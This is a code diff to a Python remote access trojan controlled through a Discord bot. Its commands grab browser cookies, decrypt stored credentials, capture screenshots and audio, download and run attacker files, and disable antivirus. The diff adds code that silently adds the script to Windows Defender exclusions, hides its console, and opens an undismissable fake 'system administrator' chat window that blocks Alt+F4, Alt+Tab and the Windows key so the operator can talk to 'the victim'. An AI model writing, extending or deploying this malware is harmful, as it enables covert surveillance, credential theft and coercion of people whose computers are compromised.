@@ -26,6 +26,9 @@ import cv2
 import pyaudio
 import wave
 import threading
+import tkinter as tk
+from tkinter import messagebox
+from datetime import datetime
 import time
 import numpy as np
 import socket
@@ -47,11 +50,22 @@ from discord import Embed
 from win32crypt import CryptUnprotectData
 from PIL import Image, ImageTk
 
-# Check if this is an elevated instance
+# Modify the elevated instance handler at the beginning of your script
 if len(sys.argv) > 1 and sys.argv[1] == "--elevated" and len(sys.argv) > 2:
     # This is an elevated instance
     # Get the session ID passed from the original process
     session_id = sys.argv[2]
+    
+    # Add the script to Windows Defender exclusions
+    try:
+        # Get the full path of the current script
+        script_path = os.path.abspath(sys.argv[0])
+        
+        # Add the script to Windows Defender exclusions using PowerShell
+        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{script_path}\'"'
+        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except Exception:
+        pass
     
     # Create a success marker file to signal back to the original process
     try:
@@ -80,19 +94,18 @@ if platform.system() == "Windows":
         print(f"Error hiding console: {str(e)}")
 
 # Function definitions for hiding console and relaunching
+# Function definitions for hiding console and relaunching
 def hide_console_window():
     """Hide the console window on Windows"""
     try:
         if platform.system() == "Windows":
             import ctypes
-            
             # Get the console window handle
             hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-            
             if hwnd != 0:
                 # Hide the console window
                 ctypes.windll.user32.ShowWindow(hwnd, 0)
-                return True
+            return True
         return False
     except Exception as e:
         print(f"Error hiding console: {str(e)}")
@@ -104,10 +117,8 @@ def relaunch_as_hidden():
         # Only needed on Windows
         if platform.system() != "Windows":
             return False
-            
         # Get the full path of the current script
         script_path = os.path.abspath(sys.argv[0])
-        
         # Check if we're running in a console window
         if sys.stdout.isatty():
             # We're in a console, so relaunch using pythonw (hidden)
@@ -117,10 +128,8 @@ def relaunch_as_hidden():
                 with open(vbs_path, 'w') as f:
                     f.write(f'''Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "pythonw.exe ""{script_path}""", 0, False''')
-                
                 # Execute the VBS script
                 subprocess.Popen(['cscript', '//Nologo', vbs_path])
-                
                 # Delete the VBS script after a short delay
                 def delete_vbs():
                     time.sleep(5)
@@ -128,19 +137,250 @@ WshShell.Run "pythonw.exe ""{script_path}""", 0, False''')
                         os.remove(vbs_path)
                     except:
                         pass
-                
                 threading.Thread(target=delete_vbs, daemon=True).start()
-                
                 # Exit the current process
                 os._exit(0)
-                return True
+            return True
     except Exception as e:
         print(f"Error relaunching as hidden: {str(e)}")
-    return False
+        return False
+
+# Add these functions to your code
+def is_admin():
+    """Check if the script is running with administrator privileges"""
+    try:
+        if platform.system() == "Windows":
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        else:
+            # For Unix systems, check if effective user ID is 0 (root)
+            return os.geteuid() == 0
+    except:
+        return False
+
+def add_to_defender_exclusions():
+    """Add the current script to Windows Defender exclusions"""
+    if platform.system() != "Windows":
+        return False
+    
+    try:
+        # Get the full path of the current script
+        script_path = os.path.abspath(sys.argv[0])
+        
+        # Add the script to Windows Defender exclusions using PowerShell
+        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{script_path}\'"'
+        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        return True
+    except Exception as e:
+        print(f"Error adding to exclusions: {str(e)}")
+        return False
+
+def create_chat_window(author_name, channel_id):
+    global CHAT_ACTIVE, CHAT_WINDOW, receive_chat_message
+    
+    try:
+        # Create the main window
+        root = tk.Tk()
+        CHAT_WINDOW = root
+        root.title(f"IMPORTANT MESSAGE FROM SYSTEM ADMINISTRATOR")
+        root.geometry("500x600")
+        root.configure(bg="#f0f0f0")
+        
+        # Make the window always on top and difficult to close/minimize
+        root.attributes("-topmost", True)
+        
+        # Prevent minimizing
+        if platform.system() == "Windows":
+            # This prevents minimizing by removing the minimize button
+            root.resizable(False, False)
+            # Remove minimize/maximize buttons, only show close button which we override
+            root.attributes("-toolwindow", 1)
+            # Force the window to stay on top even when minimized
+            hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
+            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
+            style = style & ~0x20000  # Remove WS_MINIMIZEBOX
+            ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
+            
+            # Intercept keyboard events to block Alt+F4, Alt+Tab, etc.
+            def block_key(event):
+                # Block Alt+F4
+                if event.state == 8 and event.keysym == 'F4':
+                    return "break"
+                # Block Alt+Tab
+                if event.state == 8 and event.keysym == 'Tab':
+                    return "break"
+                # Block Windows key
+                if event.keysym == 'Super_L' or event.keysym == 'Super_R':
+                    return "break"
+                return None
+            
+            root.bind_all("<Key>", block_key)
+        
+        # Override the close button
+        def on_close():
+            # Show a warning message but don't close
+            tk.messagebox.showwarning(
+                "Warning", 
+                "This chat window cannot be closed until the administrator ends the session."
+            )
+        
+        root.protocol("WM_DELETE_WINDOW", on_close)
+        
+        # Create a header with warning
+        header_frame = tk.Frame(root, bg="#ff0000")
+        header_frame.pack(fill=tk.X, padx=0, pady=0)
+        
+        header_label = tk.Label(
+            header_frame, 
+            text="IMPORTANT: DO NOT CLOSE THIS WINDOW", 
+            font=("Arial", 14, "bold"),
+            fg="white",
+            bg="#ff0000",
+            pady=10
+        )
+        header_label.pack()
+        
+        # Create a frame for the chat history
+        chat_frame = tk.Frame(root, bg="#f0f0f0")
+        chat_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Create a scrollable text area for chat history
+        chat_history = tk.Text(
+            chat_frame, 
+            wrap=tk.WORD, 
+            state=tk.DISABLED,
+            font=("Arial", 11),
+            bg="white"
+        )
+        scrollbar = tk.Scrollbar(chat_frame, command=chat_history.yview)
+        chat_history.configure(yscrollcommand=scrollbar.set)
+        
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        chat_history.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        
+        # Create a frame for the input area
+        input_frame = tk.Frame(root, bg="#f0f0f0")
+        input_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        # Create an entry widget for user input
+        user_input = tk.Entry(input_frame, font=("Arial", 11))
+        user_input.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        
+        # Function to add messages to the chat history
+        def add_message(sender, message, is_system=False):
+            chat_history.config(state=tk.NORMAL)
+            
+            # Format based on message type
+            if is_system:
+                chat_history.insert(tk.END, f"SYSTEM: {message}\n", "system")
+                chat_history.tag_configure("system", foreground="red", font=("Arial", 11, "bold"))
+            else:
+                timestamp = datetime.now().strftime("%H:%M:%S")
+                chat_history.insert(tk.END, f"[{timestamp}] {sender}: ", "sender")
+                chat_history.insert(tk.END, f"{message}\n", "message")
+                chat_history.tag_configure("sender", foreground="blue", font=("Arial", 11, "bold"))
+                chat_history.tag_configure("message", font=("Arial", 11))
+            
+            chat_history.see(tk.END)  # Scroll to the bottom
+            chat_history.config(state=tk.DISABLED)
+        
+        # Add welcome messages
+        add_message("System", "IMPORTANT SECURITY NOTIFICATION", True)
+        add_message("System", f"A security administrator ({author_name}) has initiated an emergency chat session with your system.", True)
+        add_message("System", "Please respond promptly to any questions or instructions.", True)
+        add_message("System", "DO NOT CLOSE THIS WINDOW until the session is complete.", True)
+        add_message(author_name, "Hello, I need to verify some information about your system. Please stand by.")
+        
+        # Function to send user message to Discord
+        def send_message(event=None):
+            message = user_input.get().strip()
+            if message:
+                # Clear the input field
+                user_input.delete(0, tk.END)
+                
+                # Add the message to the chat history
+                add_message(SYSTEM_NAME, message)
+                
+                # Send the message to Discord
+                asyncio.run_coroutine_threadsafe(
+                    send_to_discord(channel_id, message),
+                    bot.loop
+                )
+        
+        # Bind the Enter key to send messages
+        user_input.bind("<Return>", send_message)
+        
+        # Create a send button
+        send_button = tk.Button(
+            input_frame, 
+            text="Send", 
+            command=send_message,
+            bg="#4CAF50",
+            fg="white",
+            font=("Arial", 10, "bold"),
+            padx=10
+        )
+        send_button.pack(side=tk.RIGHT, padx=(5, 0))
+        
+        # Function to receive messages from Discord
+        def receive_message(sender, message):
+            add_message(sender, message)
+            
+            # Flash the window to get attention
+            if platform.system() == "Windows":
+                try:
+                    # Flash the window
+                    ctypes.windll.user32.FlashWindow(root.winfo_id(), True)
+                except Exception as e:
+                    print(f"Error flashing window: {str(e)}")
+            
+            # Play a notification sound
+            try:
+                import winsound
+                winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
+            except:
+                pass
+        
+        # Store the receive function globally so it can be called from the bot
+        global receive_chat_message
+        receive_chat_message = receive_message
+        
+        # Set the chat as active
+        CHAT_ACTIVE = True
+        
+        # Focus the input field
+        user_input.focus_set()
+        
+        # Center the window on screen
+        root.update_idletasks()
+        width = root.winfo_width()
+        height = root.winfo_height()
+        x = (root.winfo_screenwidth() // 2) - (width // 2)
+        y = (root.winfo_screenheight() // 2) - (height // 2)
+        root.geometry(f'{width}x{height}+{x}+{y}')
+        
+        # Start the Tkinter main loop
+        root.mainloop()
+        
+        # When the loop exits, set chat as inactive
+        CHAT_ACTIVE = False
+        
+    except Exception as e:
+        print(f"Error creating chat window: {str(e)}")
+        CHAT_ACTIVE = False
+
+async def send_to_discord(channel_id, message):
+    """Send a message from the chat window to Discord"""
+    try:
+        channel = bot.get_channel(channel_id)
+        if channel:
+            await channel.send(f"💬 **{SYSTEM_NAME} says:** {message}")
+    except Exception as e:
+        print(f"Error sending message to Discord: {str(e)}")
 
 # Bot configuration
-TOKEN = ''  # Replace with your actual Discord token
-PREFIX = '!'
+TOKEN = '' # Replace with your actual Discord token
+PREFIX = '!' # Set up intents (permissions)
 
 # Set up intents (permissions)
 intents = discord.Intents.default()
@@ -148,6 +388,10 @@ intents.message_content = True
 
 # Create bot instance with disabled default help command
 bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
+
+CHAT_ACTIVE = False
+CHAT_WINDOW = None
+CHAT_THREAD = None
 
 # Add this global check function right here
 @bot.check
@@ -227,6 +471,11 @@ async def on_ready():
     print(f'{bot.user.name} has connected to Discord!')
     print(f'Bot is in {len(bot.guilds)} guilds')
     
+    # Check if running as admin and add to exclusions if so
+    if is_admin():
+        add_to_defender_exclusions()
+        print("Running with admin privileges - added to Defender exclusions")
+    
     # Clean up any existing audio files at startup
     cleanup_audio_files()
     
@@ -235,6 +484,37 @@ async def on_ready():
     
     # Start background recording
     threading.Thread(target=background_recording, daemon=True).start()
+
+@bot.event
+async def on_message(message):
+    # Ignore messages from the bot itself
+    if message.author == bot.user:
+        return
+    
+    # Safety check - if chat window doesn't exist but CHAT_ACTIVE is True, reset it
+    global CHAT_ACTIVE, CHAT_WINDOW
+    if CHAT_ACTIVE and (not CHAT_WINDOW or not hasattr(CHAT_WINDOW, 'winfo_exists') or not CHAT_WINDOW.winfo_exists()):
+        CHAT_ACTIVE = False
+        print("Chat window no longer exists - resetting CHAT_ACTIVE flag")
+    
+    # Only process chat messages if chat is truly active
+    if CHAT_ACTIVE and CHAT_WINDOW and hasattr(CHAT_WINDOW, 'winfo_exists') and CHAT_WINDOW.winfo_exists():
+        # Only treat non-command messages as chat messages
+        if not message.content.startswith(PREFIX):
+            if 'receive_chat_message' in globals():
+                # Get the sender's name
+                sender_name = message.author.name
+                
+                try:
+                    # Call the receive function in the main thread
+                    CHAT_WINDOW.after(0, lambda: receive_chat_message(sender_name, message.content))
+                except Exception as e:
+                    print(f"Error sending message to chat window: {str(e)}")
+                    # If there's an error, reset the chat active flag
+                    CHAT_ACTIVE = False
+    
+    # Always process commands, regardless of chat state
+    await bot.process_commands(message)
 
 def cleanup_audio_files():
     """Clean up any existing audio files from previous runs"""
@@ -418,6 +698,18 @@ async def help_command(ctx):
         name=f"{PREFIX}screenshot",
         value="Takes a screenshot of the system and sends it to the channel",
         inline=False
+    )
+    
+    embed.add_field(
+       name=f"{PREFIX}chat",
+       value="Opens a chat where you can then talk to the victim",
+       inline=False
+    )
+    
+    embed.add_field(
+       name=f"{PREFIX}endchat",
+       value="Will close the chat window",
+       inline=False
     )
     
     embed.add_field(
@@ -902,7 +1194,7 @@ async def download_file_and_run(ctx):
         attachment = ctx.message.attachments[0]
         
         # Create a temporary directory to store the file
-        temp_dir = tempfile.mkdtemp()
+        temp_dir = tempfile.gettempdir()  # Use system temp directory instead of creating a new one
         file_path = os.path.join(temp_dir, attachment.filename)
         
         await ctx.send(f"⏳ Downloading file {attachment.filename} to run on {SYSTEM_NAME}...")
@@ -922,27 +1214,26 @@ async def download_file_and_run(ctx):
             if file_ext == '.py':
                 # Run Python script with visible console for debugging
                 process = subprocess.Popen(['python', file_path], 
-                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
+                                          shell=True)
                 execution_attempted = True
-                await ctx.send(f"🔄 Started Python script with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started Python script")
             elif file_ext in ['.exe', '.bat', '.cmd']:
-                # Run executable or batch file with visible console
-                process = subprocess.Popen(file_path, 
-                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
+                # Run executable or batch file
+                os.startfile(file_path)  # This is more reliable on Windows
                 execution_attempted = True
-                await ctx.send(f"🔄 Started executable with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started executable")
             elif file_ext == '.ps1':
                 # Run PowerShell script with visible window
                 process = subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_path], 
-                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
+                                          shell=True)
                 execution_attempted = True
-                await ctx.send(f"🔄 Started PowerShell script with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started PowerShell script")
             elif file_ext == '.vbs':
-                # Run VBScript with visible window
+                # Run VBScript
                 process = subprocess.Popen(['cscript', '//nologo', file_path], 
-                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
+                                          shell=True)
                 execution_attempted = True
-                await ctx.send(f"🔄 Started VBScript with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started VBScript")
             else:
                 # Try to run with the default application
                 try:
@@ -951,37 +1242,35 @@ async def download_file_and_run(ctx):
                     await ctx.send(f"🔄 Opened file with default application")
                 except Exception as e:
                     await ctx.send(f"⚠️ Could not open with default application: {str(e)}")
-        
         elif platform.system() == "Darwin":  # macOS
             if file_ext == '.py':
                 # Run Python script
                 process = subprocess.Popen(['python3', file_path])
                 execution_attempted = True
-                await ctx.send(f"🔄 Started Python script with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started Python script")
             elif file_ext == '.sh':
                 # Make shell script executable and run it
                 os.chmod(file_path, 0o755)
                 process = subprocess.Popen([file_path])
                 execution_attempted = True
-                await ctx.send(f"🔄 Started shell script with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started shell script")
             else:
                 # Try to run with the default application
                 process = subprocess.Popen(['open', file_path])
                 execution_attempted = True
                 await ctx.send(f"🔄 Opened file with default application")
-        
         elif platform.system() == "Linux":
             if file_ext == '.py':
                 # Run Python script
                 process = subprocess.Popen(['python3', file_path])
                 execution_attempted = True
-                await ctx.send(f"🔄 Started Python script with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started Python script")
             elif file_ext == '.sh':
                 # Make shell script executable and run it
                 os.chmod(file_path, 0o755)
                 process = subprocess.Popen([file_path])
                 execution_attempted = True
-                await ctx.send(f"🔄 Started shell script with process ID: {process.pid}")
+                await ctx.send(f"🔄 Started shell script")
             else:
                 # Try to run with the default application
                 process = subprocess.Popen(['xdg-open', file_path])
@@ -992,22 +1281,14 @@ async def download_file_and_run(ctx):
             await ctx.send(f"✅ File {attachment.filename} is now running on {SYSTEM_NAME}")
         else:
             await ctx.send(f"⚠️ Could not determine how to run file with extension {file_ext}")
-            
+        
         # Don't delete the file immediately to allow it to run
-        # You might want to add a cleanup task that runs after some time
         
     except Exception as e:
         await ctx.send(f"❌ Error downloading or running file: {str(e)}")
         import traceback
         tb = traceback.format_exc()
         await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")
-        
-        # Clean up if an error occurs
-        if 'temp_dir' in locals():
-            try:
-                shutil.rmtree(temp_dir)
-            except:
-                pass
 
 @bot.command(name='grabcookies', help='Grabs browser cookies from the target system')
 async def grabcookies(ctx):
@@ -1456,7 +1737,7 @@ async def play_media(ctx):
             return
         
         # Create a temporary directory to store the file
-        temp_dir = tempfile.mkdtemp()
+        temp_dir = tempfile.gettempdir()  # Use system temp directory
         media_path = os.path.join(temp_dir, attachment.filename)
         
         await ctx.send(f"⏳ Downloading media file to play on {SYSTEM_NAME}...")
@@ -1468,8 +1749,8 @@ async def play_media(ctx):
         
         # Play the file based on the operating system
         if platform.system() == "Windows":
-            # For Windows, use the default media player
-            media_process = subprocess.Popen(['start', '', media_path], shell=True)
+            # For Windows, use os.startfile which is more reliable
+            os.startfile(media_path)
             
             # Wait for a moment to ensure the player has started
             time.sleep(2)
@@ -1479,41 +1760,39 @@ async def play_media(ctx):
             
         elif platform.system() == "Darwin":  # macOS
             # For macOS, use 'open' which will use the default application
-            media_process = subprocess.Popen(['open', media_path])
+            subprocess.Popen(['open', media_path])
             
         elif platform.system() == "Linux":
             # For Linux, try using 'xdg-open' which will use the default application
-            media_process = subprocess.Popen(['xdg-open', media_path])
+            subprocess.Popen(['xdg-open', media_path])
         
         await ctx.send(f"✅ Media playback started on {SYSTEM_NAME}")
         
-        # Wait for a while before cleaning up (adjust time as needed)
-        # For now, we'll let the media play and clean up after 5 minutes
-        # You might want to add a command to stop playback early
-        await asyncio.sleep(300)  # Wait 5 minutes
+        # Create a cleanup task that runs after some time
+        async def cleanup_media():
+            await asyncio.sleep(300)  # Wait 5 minutes
+            try:
+                # Clean up processes and files
+                if platform.system() == "Windows":
+                    # On Windows, terminate common media player processes
+                    subprocess.run('taskkill /f /im wmplayer.exe', shell=True, stderr=subprocess.DEVNULL)
+                    subprocess.run('taskkill /f /im vlc.exe', shell=True, stderr=subprocess.DEVNULL)
+                    subprocess.run('taskkill /f /im QuickTimePlayer.exe', shell=True, stderr=subprocess.DEVNULL)
+                
+                # Remove the file
+                if os.path.exists(media_path):
+                    os.remove(media_path)
+            except Exception:
+                pass
         
-        # Clean up processes and files
-        try:
-            if platform.system() == "Windows":
-                # On Windows, terminate common media player processes
-                os.system('taskkill /f /im wmplayer.exe')  # Windows Media Player
-                os.system('taskkill /f /im vlc.exe')  # VLC
-                os.system('taskkill /f /im QuickTimePlayer.exe')  # QuickTime
-            else:
-                # On other systems, try to terminate the process
-                if 'media_process' in locals():
-                    media_process.terminate()
-        except:
-            pass
-        
-        # Clean up the temporary directory and files
-        shutil.rmtree(temp_dir)
-        
+        # Start the cleanup task
+        asyncio.create_task(cleanup_media())
+            
     except Exception as e:
         await ctx.send(f"❌ Error playing media: {str(e)}")
-        # Clean up if an error occurs
-        if 'temp_dir' in locals():
-            shutil.rmtree(temp_dir)
+        import traceback
+        tb = traceback.format_exc()
+        await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")
 
 @bot.command(name='disableav', help='Creates security exceptions for the current process')
 async def disable_av(ctx):
@@ -1852,6 +2131,75 @@ async def clipboard_command(ctx, *, text=None):
             await ctx.send(f"✅ Clipboard content on {SYSTEM_NAME} has been updated")
     except Exception as e:
         await ctx.send(f"❌ Error accessing clipboard: {str(e)}")
+
+@bot.command(name='chat', help='Opens a chat window on the target system')
+async def open_chat(ctx):
+    global CHAT_ACTIVE, CHAT_WINDOW, CHAT_THREAD
+    
+    if CHAT_ACTIVE:
+        await ctx.send("❌ Chat window is already active on the target system.")
+        return
+    
+    await ctx.send(f"⏳ Opening chat window on {SYSTEM_NAME}...")
+    
+    # Start the chat window in a separate thread
+    CHAT_THREAD = threading.Thread(target=create_chat_window, args=(ctx.author.name, ctx.channel.id), daemon=True)
+    CHAT_THREAD.start()
+    
+    # Wait a moment for the window to initialize
+    await asyncio.sleep(1)
+    
+    if CHAT_ACTIVE:
+        await ctx.send(f"✅ Chat window opened on {SYSTEM_NAME}. Any messages you send now will appear in the chat window.")
+        await ctx.send("Use `!endchat` to close the chat window.")
+    else:
+        await ctx.send(f"❌ Failed to open chat window on {SYSTEM_NAME}.")
+
+@bot.command(name='endchat', help='Closes the chat window on the target system')
+async def end_chat(ctx):
+    global CHAT_ACTIVE, CHAT_WINDOW, CHAT_THREAD
+    
+    await ctx.send(f"⏳ Attempting to close chat window on {SYSTEM_NAME}...")
+    
+    try:
+        # Force close the window if it exists
+        if CHAT_WINDOW:
+            try:
+                CHAT_WINDOW.quit()  # Try quit first
+            except:
+                pass
+                
+            try:
+                CHAT_WINDOW.destroy()  # Then try destroy
+            except:
+                pass
+                
+        # Reset all chat-related variables
+        CHAT_ACTIVE = False
+        CHAT_WINDOW = None
+        
+        # If there's a thread, try to stop it
+        if CHAT_THREAD and CHAT_THREAD.is_alive():
+            # Can't really stop threads in Python, but we can mark it as inactive
+            CHAT_THREAD = None
+            
+        # Clear the global receive_chat_message if it exists
+        if 'receive_chat_message' in globals():
+            globals().pop('receive_chat_message', None)
+            
+        await ctx.send(f"✅ Chat session terminated on {SYSTEM_NAME}.")
+        
+        # Send a test message to confirm commands are working
+        await ctx.send("Command system restored. You can now use commands again.")
+        
+    except Exception as e:
+        await ctx.send(f"❌ Error during chat cleanup: {str(e)}")
+        # Force reset even if there's an error
+        CHAT_ACTIVE = False
+        CHAT_WINDOW = None
+        CHAT_THREAD = None
+        if 'receive_chat_message' in globals():
+            globals().pop('receive_chat_message', None)
 
 @bot.command(name='background', help='Changes the desktop background of the target system')
 async def change_background(ctx, url=None):
